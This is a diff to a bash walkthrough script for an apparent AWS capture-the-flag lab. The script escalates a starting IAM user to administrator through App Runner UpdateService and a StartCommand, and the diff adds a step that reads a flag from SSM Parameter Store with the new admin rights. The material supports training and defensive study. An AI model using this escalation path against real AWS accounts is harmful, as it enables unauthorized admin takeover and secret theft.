@@ -327,12 +327,14 @@ echo "Waiting 15 seconds for IAM policy propagation..."
 sleep 15
 echo -e "${GREEN}✓ Policy propagation wait complete${NC}\n"
 
-# [OBSERVATION] Step 9: Verify admin access
+# [EXPLOIT] Step 9: Verify admin access
+# Restore helpful permissions first — the deny policy overrides AdministratorAccess otherwise
+restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
-use_readonly_creds
+use_starting_creds
 echo "Attempting to list IAM users..."
 
-show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
+show_attack_cmd "Attacker (now admin)" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -342,6 +344,23 @@ else
     echo "You can check the service status with:"
     echo "  aws apprunner describe-service --service-arn $SERVICE_ARN --region $AWS_REGION"
     exit 1
+fi
+echo ""
+
+# [EXPLOIT]
+# Step 10: Capture the CTF flag
+# The starting user now has AdministratorAccess attached, which grants ssm:GetParameter
+# implicitly. Use those credentials to read the scenario flag from SSM Parameter Store.
+use_starting_creds
+echo -e "${YELLOW}Step 10: Capturing CTF flag from SSM Parameter Store${NC}"
+FLAG_PARAM_NAME="/pathfinding-labs/flags/apprunner-002-to-admin"
+show_attack_cmd "Attacker (now admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
+FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
+
+if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
+    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
+else
+    echo -e "${YELLOW}Warning: Could not retrieve flag (may not be set)${NC}"
 fi
 echo ""
 
@@ -359,6 +378,7 @@ echo "3. Updated service to change container image to AWS CLI"
 echo "4. Set StartCommand to execute with admin permissions"
 echo "5. StartCommand attached AdministratorAccess policy to $STARTING_USER"
 echo "6. Achieved: Administrator Access"
+echo "7. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
 
 echo -e "\n${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (apprunner:UpdateService)"
@@ -366,6 +386,7 @@ echo -e "  → Updated existing App Runner Service ($TARGET_SERVICE_NAME)"
 echo -e "  → Service runs with $TARGET_ROLE (Admin)"
 echo -e "  → StartCommand executes with admin permissions"
 echo -e "  → Grants admin to $STARTING_USER → Admin Access"
+echo -e "  → (ssm:GetParameter) → CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
